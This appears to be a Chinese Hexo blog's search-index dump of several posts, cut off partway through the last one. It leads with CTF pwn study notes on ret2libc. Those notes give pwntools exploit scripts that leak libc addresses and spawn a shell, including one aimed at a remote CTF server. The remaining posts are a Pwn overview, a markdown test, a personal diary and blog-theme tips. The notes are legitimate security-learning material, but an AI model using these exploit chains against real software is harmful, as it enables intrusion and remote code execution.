&quot;pop_rdi_rsi_rdxret&quot; ----&quot;pop_rdi_ret&quot;----esp0: &quot;rdi&quot; &quot;1&quot; ----&quot;/bin/sh_addr&quot;----esp0+8: &#x27;pop_rsi_r15_ret&#x27; ----&quot;system_addr&quot; ----esp+16:&quot;leak_func_got&quot; 这次布栈就像ret_text中的system函数一样来布----esp+24:&quot;r15&quot; 8位可以是&quot;deadbeef&quot;----esp+32:&quot;泄露GOT真正地址的函数如write_sym&quot;----esp+40:&#x27;返回地址&#x27; # 1.padding 首先我们需要确定 padding，在哪里溢出，把这个空填满，溢出到 rbp 完 ----padding 和以前一样，看哪里 gets 或者 read 函数，这里其实就是 scanf ---- 可以通过 ida 或者动态调试得到 ---- 参考以前的题目，像 buuctf 前几道 rip,level.. # 2. 第一次溢出，目标获得的 libc 某个函数的真实地址 # 2.1 第一次溢出 比如：以下是 write 函数为例 行高亮1234567891011121314151617leak_func_name =&#x27;write&#x27; leak_func_got = elf.got[leak_func_name] # leak_func_got泄露的got表 去ida上看write的地址 #got.plt:0000000000404018 48 unk_404018 db 48h ; H OFF64 EXTDEF [extern,404048]=404048 (write)#leak_func_got = 404018return_addr = elf.symbols[&#x27;dofunc&#x27;]write_sym = elf.symbols[&#x27;write&#x27;]pop_rdi_ret = 0x4011fb #用ROPgadget查的pop_rsi_r15_ret = 0x4011f9#同上payload = b&#x27;a&#x27;* padding + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(leak_func_got) + p64(0xdeadbeef)# 产生溢出的字符串 pop_rdi_ret rdi存的值 pop_rsi_r15_ret leak_func_got泄露的got表 r15# 第一个参数 第二个参数（rdx第三个参数没有先不管）# 第一步 第2步rdi 【 第三步 plt表 】 第四步got表 第五步填deedbeef payload = payload + p64(write_sym) + p64(return_addr) # 第六步write偏移地址 第七步返回地址（进入第二次溢出的返回地址） delimiter = &#x27;input:&#x27;io.sendlineafter(delimiter, payload) # 2.2 收获这个函数的真实地址 行高亮12345678910gets_addr=u64(p.recv()[:8]) #p.recv()[:8]: 这个部分是将从管道中接收到的数据的前 8 个字节切片出来。u64换成无符号整数#puts_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;)) # 接收puts的真实地址#p.recv(6): 从管道中接收 6 个字节的数据。.ljust(8, b&#x27;\\x00&#x27;): 对接收到的 6 个字节数据进行填充，#使其总长度为 8 字节，填充内容是 0x00 字节。以后可以不是6位#puts_addr=u64(p.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,&#x27;\\0&#x27;)) #得到 puts 函数 的地址;#p.recvuntil(&#x27;\\n&#x27;): 从管道中接收数据，直到遇到换行符 \\n 为止。这个函数会将接收到的数据包括换行符在内全部返回。#[:-1]: 使用切片操作，去掉接收到的数据中的最后一个字符，即换行符 \\n。#.ljust(8, &#x27;\\0&#x27;): 将剩余的数据（不包括换行符）进行填充，使其总长度为 8 字节，填充内容是空字符 \\0。 # 3. 第二次溢出构造 payload2 # 3.1 获得基地址 行高亮12libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#本地调试，可用ldd查libc_base=gets_addr-libc.symbols[&quot;gets&quot;] # 得到基地址 # 3.2 算 system 和 binsh 地址 行高亮12system_addr=libc_base+libc.symbols[&quot;system&quot;]bin_sh_addr=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;)) 行高亮12345#远程版本libc=LibcSearcher(&quot;puts&quot;,puts_addr) # 得到 libc的版本;libc_base=puts_addr-libc.dump(&quot;puts&quot;) # 得到基地址sys_addr=libc_base+libc.dump(&quot;system&quot;) # 利用偏移地址 得到 system函数的地址binsh=libc_base+libc.dump(&quot;str_bin_sh&quot;) # 得到 bin/sh 的 地址 # 3.3 获取 shell 行高亮1234567payload2=offset*b&quot;B&quot;+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr) #64位三步走，和rettext一样一般会接收到程序本身的字符串后，再发送payloaddelimiter = &#x27;input:&#x27;io.sendlineafter(delimiter, payload2)pause()io.interactive() # 2）x86: 最大区别是参数存放不用寄存器 # 0. 使用条件 ret2libc 的使用条件 泄漏 Libc 函数地址的条件：程序有输出函数，如 puts、printf、write；要输出函数的目的是要泄漏地址 实现：设置好输出函数的参数为某函数 GOT 表地址；GOT 表中保存已调用过的函数的真实地址 # 1. 核心 泄漏 ret2libc_32 任意一个函数的位置 获取 libc 的版本 根据偏移获取 shell 和 sh 的位置 执行程序获取 shell # 2. 内存分布，举例 ---esp --- ... --- buf ---ebp 栈帧 ---write@plt 返回地址 ---main @@@@@' 预留返回地址！！！！！！！！'@@@@ --- 1 write 函数参数一 (1) ---write_got 地址 write 函数参数二 (write_got 地址) --- 4 write 函数参数三 (写 4 字节) 32 位 --- 高地址，栈底 # 3. 第一次溢出，目标：找到一个函数地址 第一个以 write 为例子： 行高亮1234567write_plt=e.plt[&quot;write&quot;]write_got=e.got[&quot;write&quot;]main_addr=e.symbols[&quot;main&quot;]# char[88] ebp write函数参数一(1) write函数参数二(write_got地址)payload=0x88*b&#x27;a&#x27;+ p32(0xdeadbeef) + p32(write_plt) + p32(main_addr) + p32(1)+p32(write_got)+p32(4)# write函数返回地址 (返回到main函数) write函数参数三(写4字节)32位# 0x88*b&#x27;a&#x27;+ p32(0xdeadbeef)其实是char和ebp分开的，可以合起来算 ' 为什么加 1，加 4' 原因：write 函数本身有三个参数（1，'hello!',5） 函数说明：write () 会把参数 buf 所指的内存写入 count 个字节到参数 fd 所指的文件内。 返回值：如果顺利 write () 会返回实际写入的字节数（len）。当有错误发生时则返回 - 1，错误代码存入 errno 中。 //write(int fd, const void *buf, size_t count); 第一个参数 文件描述符 fd 1 输出，0 输入 第二个参数 无类型的指针 buf，可以存放要写的内容 第三个参数 写多少字节数 4 字节 下面再举一个：我们决定用泄露__libc_strart_main 的地址，来判定 libc 的版本 行高亮12345678#泄露地址puts_plt = ret2libc3.plt[&#x27;puts&#x27;]libc_start_main_got = ret2libc3.got[&#x27;__libc_start_main&#x27;]main = ret2libc3.symbols[&#x27;main&#x27;]print &quot;leak libc_start_main_got addr and return to main again&quot;payload = flat([&#x27;A&#x27; * 112, puts_plt, main, libc_start_main_got])#调用puts函数后，ret到main函数，用main函数里面的gets来获取libc_start的地址sh.sendlineafter(&#x27;Can you find it !?&#x27;, payload)gets_addr = u32(p.recv()) # 4. 第二次溢出，目标：直接获得 shell，像 rettext 一样 # 4.1 获得基地址 行高亮12libc = ELF(&quot;/lib32/libc.so.6&quot;) #获得libc版本号libc_base = gets_addr - libc.symbols[&quot;gets&quot;] # 4.2system 和 binsh 地址 行高亮12system_addr = libc_base + libc.symbols[&quot;system&quot;]bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;)) # 4.3 结束 行高亮123payload2 = padding*b&quot;A&quot; + p32(system_addr) + p32(0) + p32(bin_sh_addr) #32位两步走p.sendline(payload2)p.interactive() # 4.4 补充 大佬 1 号心得 ROP 中对 retlibc 技术的一些学习心得 漏洞利用思路： 1. 找到泄露库函数地址的漏洞，获取 libc 版本（因为一般不会给你 libc.so 文件） 查询 libc 版本一般有三种方法： 1.libcsearcher 库。在编写 exp 的时候用 from LibcSearcher import LibcSearcher 导入 通过 libc.dump ('system') 可以得到 system 函数的偏移，libc.dump ('str_bin_sh') 得到 binsh 字符串的偏移 2.pwntools 自带的 Dynelf，需要先构造一个 leak 函数和一个可以不断触发溢出的漏洞 一个模板： 行高亮12345678910def leak(address): #各种预处理 payload = &quot;xxxxxxxx&quot; + address + &quot;xxxxxxxx&quot; p.send(payload) #各种处理 data = p.recv(4) log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;))) return datad = DynELF(leak, elf=ELF(&quot;./xxx&quot;)) #初始化DynELF模块 systemAddress = d.lookup(&#x27;system&#x27;, &#x27;libc&#x27;) #在libc文件中搜索system函数的地址 3. 在线查询网站，通过函数的后三位数值查询。https://libc.blukat.me 典型的题目–adworld 里的 level1（非常典型的 retlibc） 源码： 行高亮12345678910111213141516171819202122232425262728293031323334353637383940414243ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] printf(&quot;What&#x27;s this:%p?\\n&quot;, &amp;buf); return read(0, &amp;buf, 0x100u); //溢出点&#125;exp：from pwn import *from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#sh = process(&#x27;./level1&#x27;)sh=remote(&#x27;111.198.29.45&#x27;,42536)writeplt= 0x08048370readgot=0x0804A00Cvuln=0x0804847Bpayload = &#x27;a&#x27;*0x8c+p32(writeplt)+p32(vuln)+p32(1)+p32(readgot)+p32(4)#gdb.attach(sh)sh.sendline(payload)readaddr=u32(sh.recv(4))print(hex(readaddr))libc = LibcSearcher(&#x27;read&#x27;, readaddr)libcbase = readaddr - libc.dump(&#x27;read&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)payload=&#x27;a&#x27;*0x8c+p32(system_addr)+&#x27;a&#x27;*4+p32(binsh_addr)sh.sendline(payload)sh.interactive()sh.close() 笔记: context.log_level='debug’开启调试模式； 大佬原文链接：https://blog.csdn.net/qq_41706924/article/details/89607683","path":"CTF/Pwn/note/Pwn1/","date":"11-08","excerpt":"","tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"Pwn概述","text":"# 0X01 Pwn 简介 # 软件安全：软件安全专注于研究软件的设计和实现的安全 研究对象：代码（源码、字节码、汇编等） 研究目标：发掘漏洞、利用漏洞、修补漏洞 研究技术：逆向工程、漏洞挖掘与利用、漏洞防御技术 CTF PWN：软件安全研究的一个缩影 # 研究对象：可执行文件，主要是 ELF 文件 研究最终目标：夺取 Flag 软件安全与 CTF PWN 特点：入门难、进阶难、精通难。 # 工具： 静态分析：IDA Pro 动态调试：gdb (with peda or gef)、windbg、ollydbg Exploit：pwntools、zio # 前置技能： 汇编语言：程序执行、函数栈帧、函数调用等 编译、链接、装载、执行 ELF 文件结构 Linux 系统相关：文件描述符、系统调用、socket 编程、shell 命令 编译原理，操作系统，计算机组成原理 # 0X02 PWN 学习方法 # 学习阶段一：学习套路 套路是有限的，假以时日一定会学完的招式 针对每种套路都练习 1~2 道习题 学习完所有常见套路，大多数国内比赛的中档题基本都可以随便切 # 学习阶段二：总结套路，变套路为艺术 漏洞利用是一门艺术，难以用套路完全概况，要想切难题不能全靠套路 多刷刷国际赛的难题，刷的慢没关系，刷多了自然就会融会贯通 多总结思考现有的套路的本质 # 资源： CTF Writeup Github：https://github.com/ctfs 聚合了各大国际比赛的习题文件以及 writeup Googling:XXX writeup or XXX CTF 百度收录不了 github pages 0X03 PWN 学习案例 ROP： 1、ROP：现代栈溢出中最基础的利用技术（最简单最基础的套路） 2、Googling 筛选到比较好的题目：r0pbaby 学习 writeup，可以参考多篇 writeup，根据 writeup 和学到的内容自己动手调试一下，尽量自己动手重写 EXP 重写 EXP 成功：基本掌握了 ROP。 第二章 CTF 中漏洞挖掘的方法论：从逆向工程到漏洞挖掘 0X01 逆向工程简介 对于 PWN 来说，逆向工程的主要作用为发掘与分析漏洞 工具： 静态分析工具：IDA pro 动态调试工具：gdb、windbg、ollydbg、IDA Pro IDA pro 的 F5 大法 0X02 常见漏洞简介 在进行漏洞挖掘之前，必须对常见漏洞非常熟悉！！！ 缓冲区溢出（Buffer Overflow） 堆溢出、栈溢出、bss 溢出、data 溢出（通常覆盖指针） wellpwn、AliCTF 2016 vss、Hitcon 2015 readable、stkof、zerostorage 整数溢出（Integer Overflow） 无符号型与有符号的转换（MMACTF 2016 shadow） 整数加减乘除法，如 malloc (size*2) (pwnhub.cn calc) 整数溢出通常会进一步转换为缓冲区溢出、逻辑漏洞等其他漏洞 格式化字符串（Format String） printf (s)、sprintf (s)、fprintf (s) 等，可能导致任意地址读写（MMACTF 2016 greeting） 可以用来 leak（HCTF2016 fheap） 释放后使用（Use-After-Free） 释放掉的内存可能会被重新分配，释放后使用会导致重新分配的内存被旧的使用所改写 Double free 是一种特殊的 UAF Defcon 2014 Qualifier shitsco、AliCTF 2016 router、0CTF2016 freenote（double free）、HCTF2016 fheap（double free） 逻辑漏洞 访问控制、协议漏洞、多线程竞态条件（fake fuzz）等 0X03 漏洞挖掘中的逆向技巧 关键数据结构分析：还原结构体、接口、类等 控制流分析：理清楚程序的执行逻辑，基本要做到从反汇编代码到源码的还原 数据流分析：理清楚数据的流向 CTF 漏洞挖掘中的分析策略： 目标文件较小时，通常采用对整个目标文件进行控制流分析，做到整个程序从反汇编代码到接近源码级别的还原，还原的同时查找漏洞 目标文件较大时，逆向整个文件所需工作量太大，通常需要额外的关注数据流，并理清楚数据流所经之处的控制流，因为漏洞的触发与数据流离不开关系 无论是数据流分析和控制流分析，还原结构体、接口、类都会促进逆向工程 控制流分析的主要作用是理清楚程序的逻辑，对于规模较小的目标文件，一般选择理清整个目标文件。 代码以识别为主，不要硬逆。 善用标记，标记结构体、标记变量名、标记变量类型 F5 大法好，但是 F5 不是万能的，当发现 F5 结果比较诡异时需要在汇编层分析（如 mmactf 2016 shadow） 数据流分析 目标文件较大，全盘逆向不现实 追溯用户输入的走向，重点关注对用户输入数据处理的函数 可以在不用逆清楚控制流即可找到漏洞，需要一定的技巧性 （plaid CTF 2015 datastore） 原文链接：https://blog.csdn.net/prettyX/article/details/103173220","path":"CTF/Pwn/note/PWN概述/","date":"11-05","excerpt":"","tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"Markdown Style test","text":"This post is originated from here and is used for testing markdown style. This post contains nearly every markdown usage. Make sure all the markdown elements below show up correctly. # Headers 行高亮1234567891011121314# H1## H2### H3#### H4##### H5###### H6Alternatively, for H1 and H2, an underline-ish style:Alt-H1======Alt-H2------ # H1 # H2 # H3 # H4 # H5 # H6 Alternatively, for H1 and H2, an underline-ish style: # Alt-H1 # Alt-H2 # Emphasis 行高亮1234567Emphasis, aka italics, with *asterisks* or _underscores_.Strong emphasis, aka bold, with **asterisks** or __underscores__.Combined emphasis with **asterisks and _underscores_**.Strikethrough uses two tildes. ~~Scratch this.~~ Emphasis, aka italics, with asterisks or underscores. Strong emphasis, aka bold, with asterisks or underscores. Combined emphasis with asterisks and underscores. Strikethrough uses two tildes. Scratch this. # Lists 行高亮123456789101112131415161718192021221. First ordered list item2. Another item * Unordered sub-list.1. Actual numbers don&#x27;t matter, just that it&#x27;s a number 1. Ordered sub-list4. And another item. You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we&#x27;ll use three here to also align the raw Markdown). To have a line break without a paragraph, you will need to use two trailing spaces. Note that this line is separate, but within the same paragraph. (This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.)* Unordered list can use asterisks- Or minuses+ Or pluses- Paragraph In unordered list For example like this.Common Paragraph with some text.And more text. First ordered list item Another item Unordered sub-list. Actual numbers don't matter, just that it's a number Ordered sub-list And another item. You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we'll use three here to also align the raw Markdown). To have a line break without a paragraph, you will need to use two trailing spaces. Note that this line is separate, but within the same paragraph. (This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.) Unordered list can use asterisks Or minuses Or pluses Paragraph In unordered list For example like this. Common Paragraph with some text. And more text. # Inline HTML 行高亮1&lt;p&gt;To reboot your computer, press &lt;kbd&gt;ctrl&lt;/kbd&gt;+&lt;kbd&gt;alt&lt;/kbd&gt;+&lt;kbd&gt;del&lt;/kbd&gt;.&lt;/p&gt; &lt;p&gt;To reboot your computer, press &lt;kbd&gt;ctrl&lt;/kbd&gt;+&lt;kbd&gt;alt&lt;/kbd&gt;+&lt;kbd&gt;del&lt;/kbd&gt;.&lt;/p&gt; 行高亮1234567&lt;dl&gt; &lt;dt&gt;Definition list&lt;/dt&gt; &lt;dd&gt;Is something people use sometimes.&lt;/dd&gt; &lt;dt&gt;Markdown in HTML&lt;/dt&gt; &lt;dd&gt;Does *not* work **very** well. Use HTML &lt;em&gt;tags&lt;/em&gt;.&lt;/dd&gt;&lt;/dl&gt; &lt;dl&gt; &lt;dt&gt;Definition list&lt;/dt&gt; &lt;dd&gt;Is something people use sometimes.&lt;/dd&gt; 行高亮12&lt;dt&gt;Markdown in HTML&lt;/dt&gt;&lt;dd&gt;Does *not* work **very** well. Use HTML &lt;em&gt;tags&lt;/em&gt;.&lt;/dd&gt; &lt;/dl&gt; # Links 行高亮1234567891011121314151617[I&#x27;m an inline-style link](https://www.google.com)[I&#x27;m an inline-style link with title](https://www.google.com &quot;Google&#x27;s Homepage&quot;)[I&#x27;m a reference-style link][Arbitrary case-insensitive reference text][I&#x27;m a relative reference to a repository file](../blob/master/LICENSE)[You can use numbers for reference-style link definitions][1]Or leave it empty and use the [link text itself]Some text to show that the reference links can follow later.[arbitrary case-insensitive reference text]: https://hexo.io[1]: https://hexo.io/docs/[link text itself]: https://hexo.io/api/ I'm an inline-style link I'm an inline-style link with title I'm a reference-style link I'm a relative reference to a repository file You can use numbers for reference-style link definitions Or leave it empty and use the link text itself Some text to show that the reference links can follow later. # Images 行高亮12345678910hover to see the title text:Inline-style:![alt text](https://hexo.io/icon/favicon-196x196.png &quot;Logo Title Text 1&quot;)Reference-style:![alt text][logo][logo]: https://hexo.io/icon/favicon-196x196.png &quot;Logo Title Text 2&quot; hover to see the title text: Inline-style: Reference-style: # Code and Syntax Highlighting Inline code has back-ticks around it. 12var s = &quot;JavaScript syntax highlighting&quot;;alert(s); 12s = &quot;Python syntax highlighting&quot;print s 12No language indicated, so no syntax highlighting.But let&#x27;s throw in a &lt;b&gt;tag&lt;/b&gt;. # Tables 行高亮12345| |ASCII |HTML ||----------------|-------------------------------|-----------------------------||Single backticks|`&#x27;Isn&#x27;t this fun?&#x27;` |&#x27;Isn&#x27;t this fun?&#x27; ||Quotes |`&quot;Isn&#x27;t this fun?&quot;` |&quot;Isn&#x27;t this fun?&quot; ||Dashes |`-- is en-dash, --- is em-dash`|-- is en-dash, --- is em-dash| ASCII HTML Single backticks 'Isn't this fun?' 'Isn't this fun?' Quotes &quot;Isn't this fun?&quot; &quot;Isn't this fun?&quot; Dashes -- is en-dash, --- is em-dash -- is en-dash, --- is em-dash Colons can be used to align columns. 行高亮12345| Tables | Are | Cool || ------------- |:-------------:| -----:|| col 3 is | right-aligned | || col 2 is | centered | || zebra stripes | are neat | Tables Are Cool col 3 is right-aligned col 2 is centered zebra stripes are neat The outer pipes ( ) are optional, and you don't need to make the raw Markdown line up prettily. You can also use inline Markdown. 行高亮1234Markdown | Less | Pretty--- | --- | ---*Still* | `renders` | **nicely**1 | 2 | 3 Markdown Less Pretty Still renders nicely 1 2 3 You can find more information about LaTeX mathematical expressions here. # Blockquotes Blockquotes are very handy in email to emulate reply text. This line is part of the same quote. Quote break. This is a very long line that will still be quoted properly when it wraps. Oh boy let's keep writing to make sure this is long enough to actually wrap for everyone. Oh, you can put Markdown into a blockquote. # Horizontal Rule Three or more... 行高亮1234567891011---Hyphens***Asterisks___Underscores Hyphens Asterisks Underscores # Line Breaks 行高亮123456Here&#x27;s a line for us to start with.This line is separated from the one above by two newlines, so it will be a *separate paragraph*.This line is also a separate paragraph, but...This line is only separated by a single newline, so it&#x27;s a separate line in the *same paragraph*. Here's a line for us to start with. This line is separated from the one above by two newlines, so it will be a separate paragraph. This line is also a separate paragraph, but... This line is only separated by a single newline, so it's a separate line in the same paragraph. 行高亮123456789This is a regular paragraph.&lt;table&gt; &lt;tr&gt; &lt;td&gt;Foo&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;This is another regular paragraph. This is a regular paragraph. &lt;table&gt; &lt;tr&gt; &lt;td&gt;Foo&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; This is another regular paragraph. # Youtube videos 行高亮1234567&lt;a href=&quot;https://www.youtube.com/watch?feature=player_embedded&amp;v=ARted4RniaU&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://img.youtube.com/vi/ARted4RniaU/0.jpg&quot;alt=&quot;IMAGE ALT TEXT HERE&quot; width=&quot;240&quot; height=&quot;180&quot; border=&quot;10&quot; /&gt;&lt;/a&gt;Pure markdown version:[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/ARted4RniaU/0.jpg)](https://www.youtube.com/watch?v=ARted4RniaU) &lt;a href=&quot;https://www.youtube.com/watch?feature=player_embedded&amp;v=ARted4RniaU &quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://img.youtube.com/vi/ARted4RniaU/0.jpg&quot; alt=&quot;IMAGE ALT TEXT HERE&quot; width=&quot;240&quot; height=&quot;180&quot; border=&quot;10&quot; /&gt;&lt;/a&gt; Pure markdown version:","path":"markdown/","date":"11-04","excerpt":"This post is originated from here and is used for testing markdown style. This post contains nearly every markdown usage. Make sure all the markdown elements below show up correctly.","tags":[{"name":"Foo","slug":"Foo","permalink":"http://example.com/tags/Foo/"},{"name":"Bar","slug":"Bar","permalink":"http://example.com/tags/Bar/"}]},{"title":"我的第一篇博客","text":"# 写在前面 总觉得生活里缺少点什么，就以此来填充一下我的枯燥生活吧。 当然啦，衷心地祝福每一个到访本博客的人，你们都是我的好盆友！好基友！ hhhhh！感谢你们😘😘😘 当然这个博客，也是在学习了很多大佬的博客，兼容并蓄，哈哈哈，正好自己也是一个段子手，喜欢写一点东西。 另外，这里可以是我大学生活的一个记录吧，好啦，与君共勉。 接下来对本博客进行一个简单的介绍，作为一个开篇，嘿嘿。 # 博客功能 学习记录，生活记录等等，，，，，，，做笔记 # 笔者自介 接下来简单自报家门嘞，很久以前觉得自己的人生真的是 “丰富多彩”，哈哈，经历过很多吧，笨人记忆力还好（++ 现在还记得高考的每个科目的每道题 bushi ++{.dot .warning}），甚至想写自专，想法很好，现实骨感。 # 我的现在 学业上现在正在川大攻读网络空间安全与法学双学士学位，痛并快乐着。 生活里热爱人际交往 ，即兴演讲， 吹牛搞怪 。另外是打游戏糕手，，比如农药、元神、CF、森林、MC.... 拿王者荣耀来说吧，国服不至于，金标还是有过，元歌代言人，所以有好玩的游戏记得推我。还有是个军事迷，研究国际政治（尬黑一下，仅仅是很爱看，谈不上研究），同时喜欢看各种离奇变态杀人案，建国以来的国内外几乎看过一遍，对于小说喜欢看怪谈和推理文，其余没多大兴趣，有时犯瘾会看看爽文和言情。 技术上热衷计算机技术，数学（显然数学很菜又想学，高考 107，铭记 107，但 96 个志愿里有 43 个数学专业），热衷玩机技术，黑客技术（着迷但很菜） 运动上，渴望成为猛男（），停留在渴望。曾经羽毛球打得还行，能和高中的（渣男）打几个来回，现在打网球、排球、羽毛球。 # 我的故事 （害怕忘记，选择记录）（以下人名除了小学外的均做了一定处理和征得本人同意） **--- 小学：** 小时候在广东待了 10 年，粤语一般般，我指的是潮汕话，潮汕的朋友可以找我搓饭，最爱吃肠粉，有个从小到大的小弟刘弟毛。 印象深刻的人：是很高的潘书婷，学习超牛的邓灿炫，经常打人的郑伟超，教师子女的郑伟钊，住在隔壁的吴宗霖，，，，就记得这么多，也没联系过了，老师也是一年一换，印象不深刻。 另外呢，四年级就回老家了，重庆市忠县（没错就是那个电竞城市），顺溪小学，家住皇华城（皇上住过的小岛）对面，临江，舒服，哈哈哈，也特能吃辣。这里我认识了，emm，很多人，现在都还在联系，影响我很大的雷爽（究极搞怪人，但和我是铁哥们，生死狙击打穿，后来初中也一个班），还有成绩很好的很多很多人，yhx，rj，xcy，yyr，还有个小胖 xzw。 **--- 初中：** 初中是笨人最传奇的时候了（好汉不提当年勇），笨人初中第一次月考年级第一（喷子别喷，学校 1200 人，都过去了，wuwu），而后一发不可收拾，直接保重点高中哩（只有两次没拿期末考试年级第一）。在学校吃喝玩乐，当班长（一位很好的班长初二离开了我接班），当纪律委员，（本班在笨人的带领下喜提重点班倒数第一），但此时仍然是社恐。 **--- 初三暑假：** 这段时光是我记忆很深刻的，我第一次见识到人外有人，天外有天。我和秦峰（现就读于某 C9）走过升学的红地毯，同学们羡慕的眼光里，在学校的循环播报祝福的广播声里（我觉得世界会被我征服，确实飘了），到了忠县最好的高中。我们会提前上高中课程，和全县前 50 的同学们学习，当时数学是不等式，物理是力和运动，每天吃了睡，睡了吃，生活很好，这里认识了超级外向的任剑辉，wh，jyr，还有我觉得很虚的李某某（抽象哥穿丝袜），还有邓子城，时间不长，情谊万千。 另外就是八中夏令营了，啊，全市前几百吧，太厉害了，我倒吸一口凉气。害 \\\\\\ 太多厉害的人了。 高中的印象还很深刻，先不写了。","path":"About-me/My-first-Boke/","date":"11-02","excerpt":"","tags":[{"name":"About Me","slug":"About-Me","permalink":"http://example.com/tags/About-Me/"}]},{"title":"基于HEXO的写博客tips","text":"# 0. 踩坑 1. 图片问题： 图床不加载：添加 行高亮123&#123;% raw %&#125;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;&#123;% endraw %&#125; 2. 自动编号问题 shoka 主题隐藏目录自带标题，并设置显示小标题_shoka 主题标签_宁理大神 1996 的博客 - CSDN 博客 # 1.links 怎么放好友链接，看这里 優萌初華 琉璃的医学 & 编程笔记 優萌初華 https://shoka.lostyu.me 優萌初華 琉璃的医学 & 编程笔记 # 2.code 代码块 使用 markdown-it-prism 进行代码高亮，支持显示行号、行高亮 mark 、命令行提示符 command 、代码块标题。 基本格式：[language][title][url][linktext][mark][command]基本格式： [language] [title] [url] [link text] [mark] [command] 基本格式：[language][title][url][linktext][mark][command] 举个栗子： 行高亮 mark:1,6-7123456import java.util.Scanner;...Scanner in = new Scanner (System.in);// 输入 Scan 之后，按下键盘 Alt + “/” 键，Eclipse 下自动补全。System.out.println (in.nextLine ());System.out.println (&quot;Hello&quot; + &quot;world.&quot;); 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1234567891011pwd/usr/home/chris/binls -latotal 2drwxr-xr-x 2 chris chris 11 Jan 10 16:48 .drwxr--r-x 45 chris chris 92 Feb 14 11:10 ..-rwxr-xr-x 1 chris chris 444 Aug 25 2013 backup-rwxr-xr-x 1 chris chris 642 Jan 17 14:42 deploygit add -Agit commit -m &quot;update&quot;git push 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)123456789101112131415161718192021```java 行高亮 www.baidu.com 参考链接 mark:1,6-7import java.util.Scanner;...Scanner in = new Scanner (System.in);// 输入 Scan 之后，按下键盘 Alt + “/” 键，Eclipse 下自动补全。System.out.println (in.nextLine ());System.out.println (&quot;Hello&quot; + &quot;world.&quot;);``````bash 命令行提示符 command:(&quot;[root@localhost] $&quot;:1,9-10||&quot;[admin@remotehost] #&quot;:4-6)pwd/usr/home/chris/binls -latotal 2drwxr-xr-x 2 chris chris 11 Jan 10 16:48 .drwxr--r-x 45 chris chris 92 Feb 14 11:10 ..-rwxr-xr-x 1 chris chris 444 Aug 25 2013 backup-rwxr-xr-x 1 chris chris 642 Jan 17 14:42 deploygit add -Agit commit -m &quot;update&quot;git push``` 常用到的指令： java 行高亮 mark:1, 某某 bash 命令提示符 command:(&quot;[root@你的名字] $&quot;:1,9-10||&quot;[admin@你的名字] #&quot;:4-6) # 3. 表情包 emoji 绘文字 本功能基于 markdown-it-emoji ，所有标签参考戳此：markdown-it-emoji/lib/data/full.json at master · markdown-it/markdown-it-emoji (github.com) 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)123:kissing_heart::ring::notes: 如：😘 💍 两个冒号 # 4. 文字特效 本功能基于 markdown-it-ins 、 markdown-it-bracketed-spans 和 markdown-it-attrs 本主题风格颜色通用样式：default、primary、success、info、warning、danger 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)12345678910111213141516171819202122++ 下划线 ++++ 波浪线 ++&#123;.wavy&#125;++ 着重点 ++&#123;.dot&#125;++ 紫色下划线 ++&#123;.primary&#125;++ 绿色波浪线 ++&#123;.wavy .success&#125;++ 黄色着重点 ++&#123;.dot .warning&#125;~~ 删除线～～~~ 红色删除线～～&#123;.danger&#125;== 荧光高亮 ==[赤橙黄绿青蓝紫]&#123;.rainbow&#125;[红色]&#123;.red&#125;[粉色]&#123;.pink&#125;[橙色]&#123;.orange&#125;[黄色]&#123;.yellow&#125;[绿色]&#123;.green&#125;[靛青]&#123;.aqua&#125;[蓝色]&#123;.blue&#125;[紫色]&#123;.purple&#125;[灰色]&#123;.grey&#125;快捷键 [Ctrl]&#123;.kbd&#125; + [C]&#123;.kbd .red&#125;H~2~029^th^ 这段代码因为自动被 pangu.js 处理了一下，加了几个空格，导致直接复制代码不能正常显示。 正确的代码是 下划线 删除线 荧光高亮 ，不能有空格哦。 # 5. 隐藏文字 行高亮12!! 黑幕黑幕黑幕黑幕黑幕黑幕！！： 鼠标滑过显示内容!! 模糊模糊模糊模糊模糊模糊！！&#123;.bulr&#125; ： 选中文字显示内容 !! 黑幕黑幕黑幕黑幕黑幕黑幕！！： 鼠标滑过显示内容 !! 模糊模糊模糊模糊模糊模糊！！{.bulr} ： 选中文字显示内容","path":"写博客教程/","date":"11-02","excerpt":"","tags":[{"name":"博客说明","slug":"博客说明","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"}]},{"title":"基于hexo和shoka的博客使用教程","text":"# 1.hexo 官方教程 Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. # Create a new post 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo new &quot;My New Post&quot; More info: Writing # Run server 命令行提示符 command:(\"[root@localhost] 